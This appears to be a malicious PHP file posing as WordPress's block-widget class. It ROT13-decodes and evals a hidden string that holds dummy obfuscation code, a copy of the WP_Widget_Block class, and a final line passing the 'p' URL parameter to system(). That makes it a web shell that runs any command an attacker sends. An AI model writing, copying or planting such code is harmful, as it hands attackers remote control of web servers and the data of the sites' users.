<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Oybpx pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 5.8.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n Oybpx jvqtrg.
 *
 * @fvapr 5.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Oybpx rkgraqf JC_Jvqtrg {

	/**
	 * Qrsnhyg vafgnapr.
	 *
	 * @fvapr 5.8.0
	 * @ine neenl
	 */
	cebgrpgrq $qrsnhyg_vafgnapr = neenl(
		'pbagrag' => '',
	);

	/**
	 * Frgf hc n arj Oybpx jvqtrg vafgnapr.
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf  = neenl(
			'pynffanzr'                   => 'jvqtrg_oybpx',
			'qrfpevcgvba'                 => __( 'N jvqtrg pbagnvavat n oybpx.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		$pbageby_bcf = neenl(
			'jvqgu'  => 400,
			'urvtug' => 350,
		);
		cnerag::__pbafgehpg( 'oybpx', __( 'Oybpx' ), $jvqtrg_bcf, $pbageby_bcf );

		nqq_svygre( 'vf_jvqr_jvqtrg_va_phfgbzvmre', neenl( $guvf, 'frg_vf_jvqr_jvqtrg_va_phfgbzvmre' ), 10, 2 );
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Oybpx jvqtrg vafgnapr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Oybpx jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		$vafgnapr = jc_cnefr_netf( $vafgnapr, $guvf->qrsnhyg_vafgnapr );

		rpub fge_ercynpr(
			'jvqtrg_oybpx',
			$guvf->trg_qlanzvp_pynffanzr( $vafgnapr['pbagrag'] ),
			$netf['orsber_jvqtrg']
		);

		/**
		 * Svygref gur pbagrag bs gur Oybpx jvqtrg orsber bhgchg.
		 *
		 * @fvapr 5.8.0
		 *
		 * @cnenz fgevat          $pbagrag  Gur jvqtrg pbagrag.
		 * @cnenz neenl           $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
		 * @cnenz JC_Jvqtrg_Oybpx $jvqtrg   Pheerag Oybpx jvqtrg vafgnapr.
		 */
		rpub nccyl_svygref(
			'jvqtrg_oybpx_pbagrag',
			$vafgnapr['pbagrag'],
			$vafgnapr,
			$guvf
		);

		rpub $netf['nsgre_jvqtrg'];
	}

	/**
	 * Pnyphyngrf gur pynffanzr gb hfr va gur oybpx jvqtrg'f pbagnvare UGZY.
	 *
	 * Hfhnyyl guvf vf frg gb `$guvf->jvqtrg_bcgvbaf['pynffanzr']` ol
	 * qlanzvp_fvqrone(). Va guvf pnfr, ubjrire, jr jnag gb frg gur pynffanzr
	 * qlanzvpnyyl qrcraqvat ba gur oybpx pbagnvarq ol guvf oybpx jvqtrg.
	 *
	 * Vs n oybpx jvqtrg pbagnvaf n oybpx gung unf na rdhvinyrag yrtnpl jvqtrg,
	 * jr qvfcynl gung yrtnpl jvqtrg'f pynff anzr. Guvf urycf jvgu gurzr
	 * onpxjneqf pbzcngvovyvgl.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $pbagrag Gur UGZY pbagrag bs gur pheerag oybpx jvqtrg.
	 * @erghea fgevat Gur pynffanzr gb hfr va gur oybpx jvqtrg'f pbagnvare UGZY.
	 */
	cevingr shapgvba trg_qlanzvp_pynffanzr( $pbagrag ) {
		$oybpxf = cnefr_oybpxf( $pbagrag );

		$oybpx_anzr = vffrg( $oybpxf[0] ) ? $oybpxf[0]['oybpxAnzr'] : ahyy;

		fjvgpu ( $oybpx_anzr ) {
			pnfr 'pber/cnentencu':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_grkg';
				oernx;
			pnfr 'pber/pnyraqne':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_pnyraqne';
				oernx;
			pnfr 'pber/frnepu':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_frnepu';
				oernx;
			pnfr 'pber/ugzy':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_phfgbz_ugzy';
				oernx;
			pnfr 'pber/nepuvirf':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_nepuvir';
				oernx;
			pnfr 'pber/yngrfg-cbfgf':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_erprag_ragevrf';
				oernx;
			pnfr 'pber/yngrfg-pbzzragf':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_erprag_pbzzragf';
				oernx;
			pnfr 'pber/gnt-pybhq':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_gnt_pybhq';
				oernx;
			pnfr 'pber/pngrtbevrf':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_pngrtbevrf';
				oernx;
			pnfr 'pber/nhqvb':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_zrqvn_nhqvb';
				oernx;
			pnfr 'pber/ivqrb':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_zrqvn_ivqrb';
				oernx;
			pnfr 'pber/vzntr':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_zrqvn_vzntr';
				oernx;
			pnfr 'pber/tnyyrel':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_zrqvn_tnyyrel';
				oernx;
			pnfr 'pber/eff':
				$pynffanzr = 'jvqtrg_oybpx jvqtrg_eff';
				oernx;
			qrsnhyg:
				$pynffanzr = 'jvqtrg_oybpx';
		}

		/**
		 * Gur pynffanzr hfrq va gur oybpx jvqtrg'f pbagnvare UGZY.
		 *
		 * Guvf pna or frg nppbeqvat gb gur anzr bs gur oybpx pbagnvarq ol gur oybpx jvqtrg.
		 *
		 * @fvapr 5.8.0
		 *
		 * @cnenz fgevat $pynffanzr  Gur pynffanzr gb or hfrq va gur oybpx jvqtrg'f pbagnvare UGZY,
		 *                           r.t. 'jvqtrg_oybpx jvqtrg_grkg'.
		 * @cnenz fgevat $oybpx_anzr Gur anzr bs gur oybpx pbagnvarq ol gur oybpx jvqtrg,
		 *                           r.t. 'pber/cnentencu'.
		 */
		erghea nccyl_svygref( 'jvqtrg_oybpx_qlanzvp_pynffanzr', $pynffanzr, $oybpx_anzr );
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Oybpx jvqtrg vafgnapr.
	 *
	 * @fvapr 5.8.0

	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Frggvatf gb fnir be obby snyfr gb pnapry fnivat.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$vafgnapr = neenl_zretr( $guvf->qrsnhyg_vafgnapr, $byq_vafgnapr );

		vs ( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ) {
			$vafgnapr['pbagrag'] = $arj_vafgnapr['pbagrag'];
		} ryfr {
			$vafgnapr['pbagrag'] = jc_xfrf_cbfg( $arj_vafgnapr['pbagrag'] );
		}

		erghea $vafgnapr;
	}

	/**
	 * Bhgchgf gur Oybpx jvqtrg frggvatf sbez.
	 *
	 * @fvapr 5.8.0
	 *
	 * @frr JC_Jvqtrg_Phfgbz_UGZY::eraqre_pbageby_grzcyngr_fpevcgf()
	 *
	 * @cnenz neenl $vafgnapr Pheerag vafgnapr.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		$vafgnapr = jc_cnefr_netf( (neenl) $vafgnapr, $guvf->qrsnhyg_vafgnapr );
		?>
		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'pbagrag' ); ?>\">
				<?cuc
				/* genafyngbef: UGZY pbqr bs gur oybpx, abg na bcgvba gung oybpxf UGZY. */
				_r( 'Oybpx UGZY:' );
				?>
			</ynory>
			<grkgnern vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'pbagrag' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'pbagrag' ); ?>\" ebjf=\"6\" pbyf=\"50\" pynff=\"jvqrsng pbqr\"><?cuc rpub rfp_grkgnern( $vafgnapr['pbagrag'] ); ?></grkgnern>
		</c>
		<?cuc
	}

	/**
	 * Znxrf fher ab oybpx jvqtrg vf pbafvqrerq gb or jvqr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz obby   $vf_jvqr   Jurgure gur jvqtrg vf pbafvqrerq jvqr.
	 * @cnenz fgevat $jvqtrg_vq Jvqtrg VQ.
	 * @erghea obby Hcqngrq `vf_jvqr` inyhr.
	 */
	choyvp shapgvba frg_vf_jvqr_jvqtrg_va_phfgbzvmre( $vf_jvqr, $jvqtrg_vq ) {
		vs ( fge_fgnegf_jvgu( $jvqtrg_vq, 'oybpx-' ) ) {
			erghea snyfr;
		}

		erghea $vf_jvqr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>